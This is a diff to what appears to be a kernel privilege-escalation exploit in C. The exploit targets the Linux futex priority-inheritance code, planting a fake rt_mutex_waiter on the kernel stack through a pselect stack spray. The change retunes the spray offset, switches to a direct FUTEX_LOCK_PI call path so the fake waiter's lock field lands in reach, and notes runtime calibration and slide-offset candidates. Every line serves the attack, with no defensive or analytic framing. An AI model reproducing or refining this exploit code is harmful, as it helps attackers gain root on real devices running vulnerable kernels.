@@ -62,16 +62,19 @@
  *   the thread stack, so the fake waiter NEVER lands (verified: nfds=576
  *   crashes with 0x3c80..0x3ce0 all zeros).
  *
- * With nfds=320 only global qwords 0..14 are reachable.  The walked futex
- * rt_mutex_waiter (FUTEX_WAIT_REQUEUE_PI) sits at stack+0x3c80 (=G12);
- * its ->lock at +0x58 = 0x3cd8 = G23 is UNREACHABLE, so a full 14-word
- * fake cannot be placed there.  SHIFT must instead be tuned at runtime to
- * whichever futex call path places its rt_mutex_waiter in the 15-qword
- * on-stack window; keep this value overridable, default 12 = word0 at
- * 0x3c80 (the only verified overlap).
+ * With nfds=320 only global qwords 0..14 are reachable.  The original
+ * FUTEX_WAIT_REQUEUE_PI path places the rt_mutex_waiter at stack+0x3c80
+ * (= G12), so its ->lock at +0x58 = 0x3cd8 = G23 is UNREACHABLE.
+ * Direct FUTEX_LOCK_PI (SLIDE_DIRECT_LOCK_PI) drops the requeue frames and
+ * puts the waiter a few qwords shallower; the assumed base is ~0x3c38
+ * (G3), putting word0..word11 (lock at +0x58) at G3..G14, all inside the
+ * window.  Keep SHIFT runtime-overridable (env SLIDE_PSELECT_WORD_SHIFT)
+ * for on-device calibration; the guard disables the writer unless the
+ * fake's lock slot is reachable.
  */
 #define SLIDE_PSELECT_NFDS 320
-#define SLIDE_PSELECT_WORD_SHIFT 12
+#define SLIDE_PSELECT_WORD_SHIFT 3
+#define SLIDE_DIRECT_LOCK_PI 1
 #define SLIDE_SKIP_UNREACHABLE_LOCK 1
 #define SLIDE_P0_OFFSET_CANDIDATES                        \
   0x000000ULL, 0x010000ULL, 0x020000ULL, 0x030000ULL,     \
